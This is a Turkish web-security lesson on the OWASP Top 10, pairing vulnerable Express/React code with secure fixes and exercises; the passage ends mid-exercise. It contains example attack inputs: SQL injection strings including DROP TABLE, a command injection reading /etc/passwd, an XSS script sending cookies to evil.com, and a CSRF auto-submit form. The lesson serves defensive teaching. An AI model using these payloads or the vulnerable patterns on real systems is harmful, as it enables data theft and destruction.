---
title: "Web Güvenliği: OWASP Top 10 ve Güvenli Kod Yazma"
id: "mod-14-security/lesson-01"
estimated_minutes: 65
order: 1
tags: ["security", "owasp", "xss", "csrf", "sql-injection", "csp", "cors", "bcrypt", "argon2", "web-security"]
prerequisites: ["mod-12-auth/lesson-01"]
---

# Web Güvenliği: OWASP Top 10 ve Güvenli Kod Yazma

:::realworld
2024'te dünya genelinde ortalama bir data breach'in maliyeti 4.88 milyon dolar. Equifax'ın 2017'deki veri sızıntısı (147 milyon kullanıcı) tek bir Apache Struts güvenlik açığından kaynaklandı. Yahoo'nun 3 milyar hesabı sızdı. Bu olayların ortak noktası: bilinen ve önlenebilir güvenlik açıkları. OWASP Top 10, en kritik web güvenlik risklerini sıralayan ve her developer'ın bilmesi gereken bir rehberdir. Bu derste saldırı vektörlerini anlayacak ve her birine karşı savunma tekniklerini öğreneceksin.
:::

## Why Security? Güvenlik Neden Her Developer'ın Sorumluluğu?

Güvenlik sadece "security team'in işi" değildir. Kod yazan herkes güvenlik açığı oluşturabilir:

- **Bir XSS açığı** ile kullanıcıların session token'ları çalınabilir
- **Bir SQL injection** ile tüm veritabanı dışarı sızdırılabilir
- **Zayıf password hashing** ile kullanıcı şifreleri ele geçirilebilir
- **CSRF koruması olmadan** kullanıcı adına yetkisiz işlemler yapılabilir

:::deha-tip
Senior developer'lar güvenliği "eklenen bir özellik" değil, "mimari kararın parçası" olarak görür. Her fonksiyon yazılırken "bu nasıl exploit edilebilir?" sorusu sorulur. Security-by-design prensibi ile threat modeling yapılır ve her layer'da defense-in-depth uygulanır. Güvenlik reactive değil proactive olmalıdır.
:::

## OWASP Top 10 (2021)

:::concept[OWASP (İng: Open Web Application Security Project)]
OWASP, web uygulama güvenliği konusunda farkındalık yaratmayı ve best practice'ler oluşturmayı amaçlayan açık kaynak bir topluluktur. OWASP Top 10, en kritik web güvenlik risklerini sıralayan endüstri standardı bir rehberdir.

**Türkçe karsiligi:** Açık Web Uygulama Güvenliği Projesi
**Ne ise yarar:** Web uygulamalarındaki en yaygın güvenlik risklerini ve çözümlerini tanımlar
**Gercek hayat benzetmesi:** Deprem risk haritası gibi - en tehlikeli bölgeleri gösterir ve nasıl korunacağını söyler
:::

:::english
**OWASP Top 10 (2021 Edition):**
1. **A01: Broken Access Control** - Unauthorized access to resources
2. **A02: Cryptographic Failures** - Weak encryption, exposed secrets
3. **A03: Injection** - SQL, NoSQL, OS command injection
4. **A04: Insecure Design** - Missing threat modeling, secure design patterns
5. **A05: Security Misconfiguration** - Default configs, unnecessary features
6. **A06: Vulnerable Components** - Outdated libraries with known CVEs
7. **A07: Authentication Failures** - Weak passwords, session management
8. **A08: Data Integrity Failures** - Insecure deserialization, untrusted CI/CD
9. **A09: Logging Failures** - Missing audit logs, unmonitored events
10. **A10: SSRF** - Server-Side Request Forgery
:::

## A03: Injection Attacks

### SQL Injection

:::concept[SQL Injection (İng: SQL Injection / SQLi)]
SQL Injection, kullanıcı girdisinin doğrudan SQL sorgusuna eklenmesiyle, saldırganın kendi SQL kodunu çalıştırabilmesi güvenlik açığıdır.

**Türkçe karsiligi:** SQL Enjeksiyonu
**Ne ise yarar:** Saldırgan veritabanındaki tüm verileri okuyabilir, değiştirebilir veya silebilir
**Gercek hayat benzetmesi:** Bir formda adınızı yazmanız istenirken, yerine kasa anahtarının kodunu yazmak gibi - sistem sizi "ad" olarak kabul etmek yerine "komutu" çalıştırır
:::

:::code[javascript]{title="SQL Injection: Vulnerable vs Secure"}
// ❌ VULNERABLE: String concatenation ile SQL
app.get('/api/users', async (req, res) => {
  const { username } = req.query;

  // TEHLIKE! Kullanıcı girdisi doğrudan SQL'e ekleniyor
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  const result = await db.query(query);
  res.json(result.rows);
});

// Saldırgan şu input'u gönderirse:
// GET /api/users?username=' OR '1'='1
// Oluşan SQL: SELECT * FROM users WHERE username = '' OR '1'='1'
// Sonuç: TÜM kullanıcılar döner!

// Daha tehlikelisi:
// GET /api/users?username='; DROP TABLE users; --
// Oluşan SQL: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// Sonuç: users tablosu SİLİNİR!


// ✅ SECURE: Parameterized query (Prepared Statement)
app.get('/api/users', async (req, res) => {
  const { username } = req.query;

  // $1 placeholder kullanılıyor - input otomatik escape edilir
  const query = 'SELECT * FROM users WHERE username = $1';
  const result = await db.query(query, [username]);
  res.json(result.rows);
});

// Saldırgan aynı input'u gönderse bile:
// SQL: SELECT * FROM users WHERE username = ''' OR ''1''=''1'
// Tüm input tek bir string olarak değerlendirilir, SQL komutu olarak değil!


// ✅ SECURE: ORM kullanımı (Prisma)
const user = await prisma.user.findMany({
  where: { username: req.query.username }  // Otomatik parameterize edilir
});

// ✅ SECURE: ORM kullanımı (Sequelize)
const user = await User.findAll({
  where: { username: req.query.username }
});
:::

:::warning
**KURAL:** Kullanıcı girdisini ASLA string concatenation veya template literal ile SQL sorgusuna ekleme! Her zaman parameterized query (prepared statement) veya ORM kullan. Bu kural NoSQL veritabanları (MongoDB) için de geçerlidir - NoSQL injection da mümkündür.
:::

### NoSQL Injection

:::code[javascript]{title="NoSQL Injection (MongoDB)"}
// ❌ VULNERABLE: Kullanıcı girdisi doğrudan query'ye
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // Saldırgan body: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // Bu query TÜM kullanıcılarla eşleşir!
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
});

// ✅ SECURE: Input type validation
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // Type kontrolü - string olmalı
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await db.collection('users').findOne({
    username: username  // Artık sadece string kabul edilir
  });

  // Şifre doğrulama bcrypt ile
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    // Login başarılı
  }
});
:::

### Command Injection

:::code[javascript]{title="OS Command Injection"}
// ❌ VULNERABLE: Kullanıcı girdisi shell komutuna
const { exec } = require('child_process');

app.get('/api/ping', (req, res) => {
  const { host } = req.query;

  // Saldırgan: ?host=google.com; cat /etc/passwd
  exec(`ping -c 3 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// ✅ SECURE: execFile ile argüman ayrımı
const { execFile } = require('child_process');

app.get('/api/ping', (req, res) => {
  const { host } = req.query;

  // Input validation
  const hostPattern = /^[a-zA-Z0-9.-]+$/;
  if (!hostPattern.test(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }

  // execFile: argümanlar ayrı, shell injection mümkün değil
  execFile('ping', ['-c', '3', host], (error, stdout) => {
    res.send(stdout);
  });
});
:::

## XSS (Cross-Site Scripting)

:::concept[XSS (İng: Cross-Site Scripting)]
XSS, saldırganın bir web sayfasına zararlı JavaScript kodu enjekte etmesiyle, diğer kullanıcıların tarayıcılarında bu kodun çalışması güvenlik açığıdır.

**Türkçe karsiligi:** Siteler Arası Betik Çalıştırma
**Ne ise yarar:** Saldırgan kullanıcıların cookie'lerini çalabilir, sayfa içeriğini değiştirebilir, keylogger yerleştirebilir
**Gercek hayat benzetmesi:** Bir restoranda menüye gizlice eklenen sahte yemek gibi - müşteri menüye güvenir ve sipariş verir, ama aslında saldırganın hazırladığı şeyi alır
:::

### XSS Türleri

:::comparison
| Tur | Aciklama | Örnek | Tehlike Seviyesi |
|-----|----------|-------|------------------|
| **Stored XSS** | Zararlı kod veritabanına kaydedilir, her görüntülemede çalışır | Forum yorumuna `<script>` ekleme | Çok Yüksek |
| **Reflected XSS** | Zararlı kod URL parametresinden yansıtılır | Arama sonuçlarında `<script>` | Yüksek |
| **DOM-based XSS** | Client-side JavaScript DOM'u güvensiz manipüle eder | `innerHTML = userInput` | Yüksek |
:::

:::code[javascript]{title="XSS Saldırı ve Savunma"}
// ❌ VULNERABLE: Stored XSS
app.post('/api/comments', async (req, res) => {
  const { content } = req.body;
  // Saldırgan content: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  await db.query('INSERT INTO comments (content) VALUES ($1)', [content]);
  // Bu yorum her görüntülendiğinde script çalışır ve cookie çalınır!
});

// ❌ VULNERABLE: innerHTML kullanımı (DOM-based XSS)
// Frontend kodu:
// document.getElementById('output').innerHTML = userInput;
// Saldırgan: <img src=x onerror="alert(document.cookie)">


// ✅ SECURE: Output encoding (server-side)
const he = require('he'); // HTML entity encoder

app.get('/api/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');

  // HTML entity encoding
  const safeComments = comments.rows.map(c => ({
    ...c,
    content: he.encode(c.content)
    // <script> → &lt;script&gt; (tarayıcı bunu kod olarak çalıştırmaz)
  }));

  res.json(safeComments);
});


// ✅ SECURE: DOMPurify ile sanitization (client-side)
// import DOMPurify from 'dompurify';
// const clean = DOMPurify.sanitize(userInput);
// element.innerHTML = clean; // Zararlı tag'ler temizlenmiş olur


// ✅ SECURE: textContent kullanımı (en güvenli)
// document.getElementById('output').textContent = userInput;
// textContent HTML parse etmez, düz metin olarak gösterir
:::

:::beginner-mistake
**Hata:** React kullanıyorum, XSS'ten otomatik korunurum diye düşünmek.

React default olarak JSX'te HTML escape eder: `<div>{userInput}</div>` güvenlidir. ANCAK `dangerouslySetInnerHTML` kullanırsan korunma devre dışı kalır!

```jsx
// ❌ TEHLİKELİ - React XSS korumasını bypass eder
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ GÜVENLİ - React otomatik escape eder
<div>{userInput}</div>

// ⚠️ DİKKAT - href'te javascript: protokolü
<a href={userInput}>Tıkla</a>
// Saldırgan: javascript:alert(document.cookie)
```

`dangerouslySetInnerHTML` kullanmak ZORUNDAYSAN, önce DOMPurify ile sanitize et.
:::

## CSRF (Cross-Site Request Forgery)

:::concept[CSRF (İng: Cross-Site Request Forgery)]
CSRF, kullanıcının tarayıcısının, kullanıcının haberi olmadan başka bir web sitesine yetkili istekler göndermesi saldırısıdır.

**Türkçe karsiligi:** Siteler Arası İstek Sahteciliği
**Ne ise yarar:** Saldırgan, kurbanın oturum açtığı siteye kurbanın adına işlem yaptırabilir (para transferi, şifre değiştirme)
**Gercek hayat benzetmesi:** Birisi senin imzanı taklit edip bankaya talimat göndermesi gibi - banka imzayı gerçek sanıp işlemi yapar
:::

:::code[javascript]{title="CSRF Saldırı Senaryosu ve Korunma"}
// Saldırı senaryosu:
// 1. Kullanıcı bank.com'a giriş yapmış (session cookie var)
// 2. Saldırgan evil.com'da şu HTML'i oluşturur:
//    <img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
//    VEYA
//    <form action="https://bank.com/api/transfer" method="POST" id="evil-form">
//      <input type="hidden" name="to" value="attacker" />
//      <input type="hidden" name="amount" value="10000" />
//    </form>
//    <script>document.getElementById('evil-form').submit();</script>
// 3. Kullanıcı evil.com'u ziyaret edince, tarayıcı bank.com'a
//    session cookie ile birlikte istek gönderir
// 4. bank.com isteği gerçek kullanıcıdan geldi sanıp işlemi yapar!


// ✅ CSRF Korunma 1: CSRF Token (Synchronizer Token Pattern)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Form render ederken token ekle
app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
  // <input type="hidden" name="_csrf" value="{{csrfToken}}" />
});

// POST'ta token doğrula
app.post('/api/transfer', csrfProtection, (req, res) => {
  // csurf middleware otomatik olarak token'ı doğrular
  // Token eşleşmezse 403 döner
});


// ✅ CSRF Korunma 2: SameSite Cookie
app.use(session({
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'    // Cookie sadece aynı siteden gelen isteklerde gönderilir
    // 'lax' - GET isteklerinde gönderilir (navigation)
    // 'strict' - sadece aynı siteden (en güvenli)
    // 'none' - her yerden (CORS gerektiren durumlar, Secure zorunlu)
  }
}));


// ✅ CSRF Korunma 3: Custom Header Kontrolü
app.use((req, res, next) => {
  // AJAX istekleri custom header ekleyebilir, cross-origin form submit edemez
  if (req.method !== 'GET' && !req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'CSRF check failed' });
  }
  next();
});
:::

## Input Validation

:::concept[Input Validation (İng: Input Validation)]
Input validation, kullanıcıdan gelen verilerin beklenen format, tip ve aralıkta olup olmadığını kontrol etme sürecidir.

**Türkçe karsiligi:** Girdi Doğrulama
**Ne ise yarar:** Zararlı veya hatalı verilerin uygulamaya girmesini engeller
**Gercek hayat benzetmesi:** Havaalanı güvenlik kontrolü gibi - yolcu bagajını tarar, tehlikeli maddeleri tespit eder ve geçirmez
:::

:::code[javascript]{title="Input Validation: Joi ve Zod ile"}
// ✅ Joi ile validation (Express)
const Joi = require('joi');

const registerSchema = Joi.object({
  name: Joi.string()
    .min(2)
    .max(50)
    .pattern(/^[a-zA-ZğüşöçİĞÜŞÖÇ\s]+$/)  // Sadece harfler
    .required(),

  email: Joi.string()
    .email()
    .max(255)
    .required(),

  password: Joi.string()
    .min(8)
    .max(128)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .required()
    .messages({
      'string.pattern.base': 'Şifre en az bir küçük harf, bir büyük harf, bir rakam ve bir özel karakter içermelidir'
    }),

  age: Joi.number()
    .integer()
    .min(13)
    .max(120)
    .optional()
});

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,      // Tüm hataları göster
      stripUnknown: true       // Bilinmeyen alanları çıkar
    });

    if (error) {
      return res.status(400).json({
        error: 'Validation hatası',
        details: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message
        }))
      });
    }

    req.body = value;          // Sanitize edilmiş veriyi kullan
    next();
  };
}

app.post('/api/auth/register', validate(registerSchema), async (req, res) => {
  // req.body artık validate ve sanitize edilmiş
});


// ✅ Zod ile validation (TypeScript)
// import { z } from 'zod';
//
// const RegisterSchema = z.object({
//   name: z.string().min(2).max(50),
//   email: z.string().email().max(255),
//   password: z.string().min(8).max(128)
//     .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/),
//   age: z.number().int().min(13).max(120).optional()
// });
//
// type RegisterInput = z.infer<typeof RegisterSchema>;
:::

:::tip
**Validation kuralı:** Input'u iki yerde validate et: (1) Client-side - UX için (hızlı geri bildirim), (2) Server-side - güvenlik için (ZORUNLU). Client-side validation atlanabilir (curl, Postman, devtools), server-side validation asla atlanamaz. Server-side validation olmadan client-side validation GÜVENLİK SAĞLAMAZ.
:::

## Content Security Policy (CSP)

:::concept[CSP (İng: Content Security Policy)]
CSP, tarayıcıya hangi kaynaklardan (script, style, image, font) içerik yüklenebileceğini söyleyen bir HTTP header'ıdır. XSS saldırılarını önlemenin en etkili yollarından biridir.

**Türkçe karsiligi:** İçerik Güvenlik Politikası
**Ne ise yarar:** Inline script çalıştırmayı, bilinmeyen kaynaklardan script yüklemeyi engeller
**Gercek hayat benzetmesi:** Binanın güvenlik kuralları gibi - sadece tanımlı kapılardan giriş yapılabilir, tanımsız kapılar kapalı
:::

:::code[javascript]{title="Content Security Policy Implementasyonu"}
const helmet = require('helmet');

// ✅ Helmet ile CSP (Express.js)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],                    // Varsayılan: sadece kendi domain
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"], // Script kaynakları
      styleSrc: ["'self'", "'unsafe-inline'"],   // Style kaynakları
      imgSrc: ["'self'", "data:", "https:"],     // Görsel kaynakları
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"], // AJAX/fetch kaynakları
      frameSrc: ["'none'"],                      // iframe YASAK
      objectSrc: ["'none'"],                     // Flash/applet YASAK
      upgradeInsecureRequests: [],               // HTTP → HTTPS
    }
  }
}));

// Manuel CSP header
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-ancestors 'none'"
  );
  next();
});
:::

## CORS (Cross-Origin Resource Sharing)

:::concept[CORS (İng: Cross-Origin Resource Sharing)]
CORS, bir web sayfasının farklı bir origin'den (domain, protocol veya port) kaynak istemesine izin veren bir mekanizmadır. Tarayıcılar Same-Origin Policy ile farklı origin'lere yapılan istekleri varsayılan olarak engeller.

**Türkçe karsiligi:** Çapraz Kaynak Paylaşımı
**Ne ise yarar:** API'nin hangi domain'lerden erişilebileceğini kontrol eder
**Gercek hayat benzetmesi:** Bir ülkenin vize politikası gibi - hangi ülkelerin vatandaşlarının girebileceğini belirler
:::

:::code[javascript]{title="CORS Yapılandırması"}
const cors = require('cors');

// ❌ TEHLİKELİ: Herkese açık
app.use(cors());  // Access-Control-Allow-Origin: *

// ❌ TEHLİKELİ: Wildcard + credentials
app.use(cors({
  origin: '*',
  credentials: true  // BU ÇALIŞMAZ ve güvensizdir
}));

// ✅ GÜVENLİ: Whitelist ile
const allowedOrigins = [
  'https://myapp.com',
  'https://admin.myapp.com',
  process.env.NODE_ENV === 'development' && 'http://localhost:3000'
].filter(Boolean);

app.use(cors({
  origin: function(origin, callback) {
    // Server-to-server isteklerde origin undefined olabilir
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS policy violation'));
    }
  },
  credentials: true,             // Cookie gönderilmesine izin ver
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400                  // Preflight cache: 24 saat
}));
:::

:::beginner-mistake
**Hata:** CORS hatası alınca `origin: '*'` ile tüm origin'lere izin vermek.

CORS bir güvenlik mekanizmasıdır, "sorun" değildir. `origin: '*'` ile credentials (cookie) gönderilemez ve API'niz her siteden erişilebilir hale gelir. Sadece izin vermeniz gereken domain'leri whitelist'e ekleyin.

CORS sadece **tarayıcı** tarafından uygulanan bir güvenlik mekanizmasıdır. `curl` veya Postman CORS'u umursamaz. Bu yüzden CORS tek başına yeterli bir güvenlik önlemi değildir - mutlaka authentication da gereklidir.
:::

## Security Headers

:::code[javascript]{title="Güvenlik Header'ları (Helmet.js)"}
const helmet = require('helmet');

// Helmet tüm güvenlik header'larını otomatik ekler
app.use(helmet());

// Veya tek tek yapılandır:
app.use(helmet.hsts({               // HTTP Strict Transport Security
  maxAge: 31536000,                  // 1 yıl boyunca sadece HTTPS
  includeSubDomains: true,
  preload: true
}));

app.use(helmet.noSniff());           // X-Content-Type-Options: nosniff
app.use(helmet.frameguard({          // X-Frame-Options: DENY
  action: 'deny'                     // Clickjacking koruması
}));

app.use(helmet.xssFilter());        // X-XSS-Protection
app.use(helmet.referrerPolicy({     // Referrer-Policy
  policy: 'strict-origin-when-cross-origin'
}));
app.use(helmet.permittedCrossDomainPolicies()); // Adobe cross-domain
app.use(helmet.dnsPrefetchControl()); // DNS prefetch control

// ✅ Tüm güvenlik header'ları tek satırda:
// app.use(helmet());
// Bu kadar basit! Her Express uygulamasının ilk middleware'i helmet olmalı.
:::

:::comparison
| Header | Deger | Koruma |
|--------|-------|--------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | HTTPS zorunlu kılar |
| `X-Content-Type-Options` | `nosniff` | MIME type sniffing'i engeller |
| `X-Frame-Options` | `DENY` | Clickjacking'i engeller |
| `Content-Security-Policy` | `default-src 'self'` | XSS ve data injection'ı engeller |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Referrer bilgi sızıntısını engeller |
| `X-XSS-Protection` | `1; mode=block` | Tarayıcı XSS filtresi (eski) |
| `Permissions-Policy` | `camera=(), microphone=()` | API erişimini kısıtlar |
:::

## Password Hashing: bcrypt vs Argon2

:::concept[Password Hashing (İng: Password Hashing)]
Password hashing, kullanıcı şifresini tek yönlü bir fonksiyonla kriptografik olarak dönüştürerek saklamaktır. İyi bir password hash fonksiyonu yavaş olmalıdır (brute force'u zorlaştırır) ve salt kullanmalıdır.

**Türkçe karsiligi:** Şifre Hash'leme
**Ne ise yarar:** Veritabanı sızıntısında bile şifrelerin güvende kalmasını sağlar
**Gercek hayat benzetmesi:** Belge parçalayıcı gibi - belgeyi parçalara ayırır ama parçalardan belgeyi geri oluşturamazsın. Üstelik her parçalama farklı sonuç verir (salt).
:::

:::comparison
| Özellik | bcrypt | Argon2 | SHA-256 | MD5 |
|---------|--------|--------|---------|-----|
| Amac | Şifre hash'leme | Şifre hash'leme | Genel hash | Genel hash |
| Güvenlik | Yüksek | Çok Yüksek | Orta (şifre için uygun DEĞİL) | Düşük (KRİTİK) |
| Salt | Otomatik | Otomatik | Manuel eklenmeli | Manuel eklenmeli |
| GPU direnci | İyi | Çok İyi (memory-hard) | Zayıf | Çok Zayıf |
| Hiz ayari | Salt rounds ile | Time/memory/parallelism | Sabit | Sabit |
| Tavsiye | Production-ready | 2026+ standart | Kullanma | ASLA kullanma |
:::

:::code[javascript]{title="bcrypt vs Argon2 Kullanımı"}
// ✅ bcrypt (en yaygın, battle-tested)
const bcrypt = require('bcrypt');

async function hashPassword(password) {
  const saltRounds = 12;  // 10-14 arası önerilir
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}


// ✅ Argon2 (daha modern, OWASP önerisi)
const argon2 = require('argon2');

async function hashPasswordArgon2(password) {
  return await argon2.hash(password, {
    type: argon2.argon2id,    // Argon2id önerilir (hybrid)
    memoryCost: 65536,         // 64MB memory kullanımı
    timeCost: 3,               // 3 iterasyon
    parallelism: 4             // 4 thread
  });
}

async function verifyPasswordArgon2(password, hash) {
  return await argon2.verify(hash, password);
}

// ❌ ASLA: MD5 veya SHA-256 şifre hash'leme için
// const crypto = require('crypto');
// const hash = crypto.createHash('md5').update(password).digest('hex');
// GPU ile saniyede milyarlarca hash denenebilir!
:::

:::warning
**MD5 ve SHA-256 şifre hash'leme için ASLA kullanılmamalıdır!** Bu fonksiyonlar genel amaçlı hash fonksiyonlarıdır ve hızlı olmak için tasarlanmıştır. Modern GPU'lar SHA-256'yı saniyede milyarlarca kez çalıştırabilir. bcrypt ve Argon2 ise kasıtlı olarak yavaş tasarlanmıştır ve brute force saldırılarını pratik olarak imkansız kılar.
:::

## Secure Session Management

:::code[javascript]{title="Güvenli Session Yönetimi"}
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const Redis = require('ioredis');

const redisClient = new Redis(process.env.REDIS_URL);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  name: 'sessionId',             // Varsayılan 'connect.sid' yerine custom isim
  secret: process.env.SESSION_SECRET,  // Güçlü, uzun secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,              // JavaScript ile erişilemez (XSS koruması)
    secure: true,                // Sadece HTTPS üzerinden gönderilir
    sameSite: 'strict',          // CSRF koruması
    maxAge: 24 * 60 * 60 * 1000, // 24 saat
    domain: '.myapp.com',        // Alt domain'lerde de geçerli
    path: '/'
  }
}));

// Session fixation koruması: Login'den sonra session ID yenile
app.post('/api/login', async (req, res) => {
  // ... authentication logic ...

  // Eski session'ı yok et, yeni session oluştur
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });

    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.loginTime = Date.now();

    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Session save error' });
      res.json({ message: 'Login başarılı' });
    });
  });
});

// Logout: Session'ı tamamen yok et
app.post('/api/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ error: 'Logout error' });
    res.clearCookie('sessionId');
    res.json({ message: 'Logout başarılı' });
  });
});
:::

## Rate Limiting

:::code[javascript]{title="Rate Limiting Implementasyonu"}
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis').default;
const Redis = require('ioredis');

// Genel API rate limiter
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,    // 15 dakika
  max: 100,                     // IP başına 100 istek
  standardHeaders: true,        // RateLimit-* headers
  legacyHeaders: false,
  message: {
    error: 'Çok fazla istek gönderdiniz, lütfen bekleyin',
    retryAfter: '15 dakika'
  },
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args)
  })
});

// Login endpoint için sıkı rate limiter
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                       // 15 dakikada max 5 deneme
  message: {
    error: 'Çok fazla başarısız giriş denemesi',
    retryAfter: '15 dakika'
  },
  skipSuccessfulRequests: true   // Başarılı login'ler sayılmaz
});

app.use('/api/', apiLimiter);
app.use('/api/auth/login', loginLimiter);
:::

## Interview'da Web Security Soruları

:::interview
**Soru 1:** "XSS ve CSRF arasındaki fark nedir?"
**Cevap:** XSS: Saldırgan zararlı JavaScript kodunu web sayfasına enjekte eder, kod kurbanın tarayıcısında çalışır (saldırgan → site → kurban). CSRF: Saldırgan kurbanın tarayıcısını kullanarak kurbanın oturum açtığı siteye yetkili istek gönderir (saldırgan → kurbanın tarayıcısı → site). XSS'te kod enjeksiyonu var, CSRF'te istek sahteciliği var.

**Soru 2:** "SQL Injection'ı nasıl önlersiniz?"
**Cevap:** (1) Parameterized queries / prepared statements kullan - ASLA string concatenation ile SQL oluşturma, (2) ORM kullan (Prisma, Sequelize, TypeORM) - otomatik parameterize eder, (3) Input validation - beklenen format ve tip kontrolü, (4) Least privilege - veritabanı kullanıcısına minimum yetki ver, (5) WAF (Web Application Firewall) - ek koruma katmanı.

**Soru 3:** "bcrypt'te salt rounds ne anlama gelir?"
**Cevap:** Salt rounds (cost factor) hash hesaplamasının kaç kez tekrarlanacağını belirler. Her 1 artış hesaplama süresini 2 katına çıkarır. 12 salt rounds ile bir hash ~250ms sürer. Bu yavaşlık kasıtlıdır - brute force saldırısında saldırgan saniyede sadece 4 hash deneyebilir (SHA-256'da milyarlarca). Değer çok düşükse güvensiz, çok yüksekse kullanıcı login'de bekler.

**Soru 4:** "Helmet.js ne yapar?"
**Cevap:** Helmet.js, Express.js uygulamalarına güvenlik HTTP header'larını otomatik ekleyen bir middleware'dir. HSTS (HTTPS zorunlu), X-Content-Type-Options (MIME sniffing engelleme), X-Frame-Options (clickjacking engelleme), CSP (XSS engelleme), Referrer-Policy gibi header'ları tek satırda ekler: `app.use(helmet())`.
:::

:::exercise
## Pratik Alistirmalar

### Alistirma 1: XSS Tespiti ve Duzeltme
Asagidaki React component'inde XSS acigini bulun ve duzeltin:
```tsx
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}
```
**Gorev:** Bu component'i guvenli hale getirin. `DOMPurify` kullanarak sanitize edin.

### Alistirma 2: SQL Injection Onleme
Asagidaki Express endpoint'indeki SQL injection acigini bulun:
```typescript
app.get('/users', async (req, res) => {
  const name = req.query.name;
  const result = await db.query(`SELECT * FROM users WHERE name = '${name}'`);
  res.json(result.rows);
});
```
**Gorev:** Parameterized query kullanarak guvenli hale getirin.

### Alistirma 3: Güvenlik Header'lari
Bir Express uygulamasina asagidaki güvenlik header'larini ekleyin:
- Content-Security-Policy
- X-Content-Type-Options
- Strict-Transport-Security
- X-Frame-Options
**Gorev:** Helmet.js kullanarak ve manuel olarak iki farkli implementasyon yazin.

---

### Alistirma 4: CSRF Token Implementasyonu (Kolay)

Bir form submission'da CSRF korunmasi ekle.

```javascript
// server.js
const crypto = require("crypto");

function generateCSRFToken(sessionId) {
  return crypto.createHmac("sha256", process.env.CSRF_SECRET)
    .update(sessionId)
    .digest("hex");
}

app.get("/form", (req, res) => {
  const token = generateCSRFToken(req.session.id);
  res.render("form", { csrfToken: token });
});

app.post("/submit", (req, res) => {
  const { _csrf } = req.body;
  const expected = generateCSRFToken(req.session.id);
  if (_csrf !== expected) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }
  // TODO: Form islemini gerceklestir
});

// TODO: SameSite cookie attribute'unu ekle
// TODO: Double submit cookie pattern'i uygula
// TODO: Token'in her form submission'da yenilenmesini sagla
```

**Beklenen Sonuc:** CSRF token olmadan POST istekleri reddedilmeli. Token her oturum icin unique olmali. SameSite=Strict ile ek koruma saglanmali.
**Ipucu:** Modern tarayicilar SameSite=Lax default kullanir ama eski tarayicilar icin CSRF token hala gereklidir.

---

### Alistirma 5: Rate Limiting ve Brute Force Korunma (Kolay)

Login endpoint'ine rate limiting ve hesap kilitleme mekanizmasi ekle.

```javascript
const rateLimit = require("express-rate-limit");

// Genel API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 dakika
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Cok fazla istek, 15 dakika sonra tekrar deneyin" },
});

// Login icin siki rate limit
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 15 dakikada max 5 deneme
  skipSuccessfulRequests: true,
});

app.use("/api/", apiLimiter);
app.post("/api/auth/login", loginLimiter, loginHandler);

// TODO: IP bazli ve kullanici bazli ayri limit uygula
// TODO: Basarisiz denemelerden sonra progressive delay ekle (1s, 2s, 4s, 8s)
// TODO: Redis store ile distributed rate limiting yap
// TODO: Basarisiz login denemelerini logla (guvenlik auditi icin)
```

**Beklenen Sonuc:** 5 basarisiz login denemesinden sonra 429 status donmeli. Basarili login'ler sayilmamali. Rate limit bilgisi response header'larinda gorunmeli.
**Ipucu:** Production'da Redis store kullan (memory store tek instance'ta calisir). `X-RateLimit-Remaining` header'i ile kullaniciya bilgi ver.

---

### Alistirma 6: Input Validation ve Sanitization (Orta)

Kullanici girdilerini guvenli sekilde dogrula ve temizle.

```javascript
const { z } = require("zod");
const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");
